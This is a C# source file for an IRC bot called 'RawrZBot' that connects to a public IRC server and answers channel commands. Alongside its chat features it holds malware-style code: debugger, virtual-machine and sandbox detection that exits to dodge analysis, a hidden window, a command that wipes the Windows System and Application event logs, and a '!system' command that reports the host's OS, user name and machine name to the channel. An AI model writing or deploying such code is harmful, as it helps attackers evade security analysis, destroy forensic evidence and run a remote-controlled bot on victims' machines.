using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace RawrZBot
{
    public class IRCBot
    {

        // Anti-analysis and anti-debugging measures
        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();
        
        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        
        private static bool IsRunningInVM()
        {
            try
            {
                var processes = Process.GetProcesses();
                var vmProcesses = new[] { "vmtoolsd", "vmwaretray", "vmwareuser", "VGAuthService", "vmacthlp", "vboxservice", "vboxtray" };
                return processes.Any(p => vmProcesses.Contains(p.ProcessName.ToLower()));
            }
            catch { return false; }
        }
        
        private static bool IsSandboxed()
        {
            try
            {
                var drives = DriveInfo.GetDrives();
                return drives.Length < 2 || drives.Any(d => d.TotalSize < 100000000000); // Less than 100GB
            }
            catch { return false; }
        }
        
        private static void AntiAnalysis()
        {
            if (IsDebuggerPresent() || IsRunningInVM() || IsSandboxed())
            {
                Environment.Exit(0);
            }
        }


        // Stealth and evasion techniques
        private static void HideProcess()
        {
            try
            {
                var currentProcess = Process.GetCurrentProcess();
                currentProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            }
            catch { }
        }
        
        private static void ClearEventLogs()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c wevtutil cl System & wevtutil cl Application",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
            catch { }
        }


        // Encryption utilities
        private static class Crypto
        {
            private static readonly byte[] Key = Encoding.UTF8.GetBytes("RawrZBot2024SecretKey!@#$%^&*()");
            private static readonly byte[] IV = Encoding.UTF8.GetBytes("RawrZBot2024IV!");
            
            public static string Encrypt(string plainText)
            {
                try
                {
                    using var aes = Aes.Create();
                    aes.Key = Key;
                    aes.IV = IV;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    using var encryptor = aes.CreateEncryptor();
                    var plainBytes = Encoding.UTF8.GetBytes(plainText);
                    var encryptedBytes = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
                    return Convert.ToBase64String(encryptedBytes);
                }
                catch { return plainText; }
            }
            
            public static string Decrypt(string cipherText)
            {
                try
                {
                    using var aes = Aes.Create();
                    aes.Key = Key;
                    aes.IV = IV;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    using var decryptor = aes.CreateDecryptor();
                    var cipherBytes = Convert.FromBase64String(cipherText);
                    var decryptedBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
                    return Encoding.UTF8.GetString(decryptedBytes);
                }
                catch { return cipherText; }
            }
        }


        private TcpClient _client;
        private NetworkStream _stream;
        private StreamReader _reader;
        private StreamWriter _writer;
        private bool _connected;
        private bool _running;
        private readonly string _server = "irc.rizon.net";
        private readonly int _port = 6667;
        private readonly string[] _channels = new[] { "#rawr", "#test" };
        private readonly string _nick = "RawrZTestBot";
        private readonly string _username = "rawrzuser";
        private readonly string _realname = "RawrZ Test Bot";
        private readonly string _password = "";
        
        public void Start()
        {
            AntiAnalysis();
            HideProcess();
            
            _running = true;
            Connect();
            
            while (_running)
            {
                try
                {
                    if (!_connected)
                    {
                        Thread.Sleep(5000);
                        Connect();
                        continue;
                    }
                    
                    var line = _reader.ReadLine();
                    if (line != null)
                    {
                        HandleMessage(line);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ERROR] {ex.Message}");
                    _connected = false;
                    Thread.Sleep(5000);
                }
            }
        }
        
        private void Connect()
        {
            try
            {
                _client = new TcpClient();
                _client.Connect(_server, _port);
                _stream = _client.GetStream();
                _reader = new StreamReader(_stream);
                _writer = new StreamWriter(_stream) { AutoFlush = true };
                
                if (!string.IsNullOrEmpty(_password))
                {
                    _writer.WriteLine($"PASS {_password}");
                }
                
                _writer.WriteLine($"NICK {_nick}");
                _writer.WriteLine($"USER {_username} 0 * :{_realname}");
                
                _connected = true;
                Console.WriteLine($"[BOT] Connected to {_server}:{_port}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Connection failed: {ex.Message}");
                _connected = false;
            }
        }
        
        private void HandleMessage(string message)
        {
            Console.WriteLine($"[IRC] {message}");
            
            if (message.StartsWith("PING"))
            {
                var response = message.Replace("PING", "PONG");
                _writer.WriteLine(response);
                return;
            }
            
            if (message.Contains("376") || message.Contains("422"))
            {
                foreach (var channel in _channels)
                {
                    _writer.WriteLine($"JOIN {channel}");
                }
                return;
            }
            
            var match = Regex.Match(message, @"^:([^!]+)!([^@]+)@([^\\s]+)\\s+PRIVMSG\\s+([^\\s]+)\\s+:(.*)$");
            if (match.Success)
            {
                var sender = match.Groups[1].Value;
                var target = match.Groups[4].Value;
                var text = match.Groups[5].Value;
                
                HandleCommand(sender, target, text);
            }
        }
        
        private void HandleCommand(string sender, string target, string command)
        {
            var parts = command.Split(' ');
            var cmd = parts[0].ToLower();
            
            switch (cmd)
            {
                case "!ping":
                    SendMessage(target, "Pong! Bot is alive.");
                    break;
                case "!info":
                    SendMessage(target, "RawrZ Security Bot v2.0 - Advanced IRC Bot with encryption and stealth capabilities");
                    break;
                case "!encrypt":
                    if (parts.Length > 1)
                    {
                        var text = string.Join(" ", parts.Skip(1));
                        var encrypted = Crypto.Encrypt(text);
                        SendMessage(target, $"Encrypted: {encrypted}");
                    }
                    break;
                case "!decrypt":
                    if (parts.Length > 1)
                    {
                        var text = string.Join(" ", parts.Skip(1));
                        var decrypted = Crypto.Decrypt(text);
                        SendMessage(target, $"Decrypted: {decrypted}");
                    }
                    break;
                case "!system":
                    var systemInfo = $"OS: {Environment.OSVersion}, User: {Environment.UserName}, Machine: {Environment.MachineName}";
                    SendMessage(target, systemInfo);
                    break;
                case "!exit":
                    if (sender.ToLower() == "rawrztestbot")
                    {
                        SendMessage(target, "Shutting down...");
                        _running = false;
                    }
                    break;
            }
        }
        
        private void SendMessage(string target, string message)
        {
            try
            {
                _writer.WriteLine($"PRIVMSG {target} :{message}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Failed to send message: {ex.Message}");
            }
        }

    }

    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                var bot = new IRCBot();
                bot.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] {ex.Message}");
            }
        }
    }
}
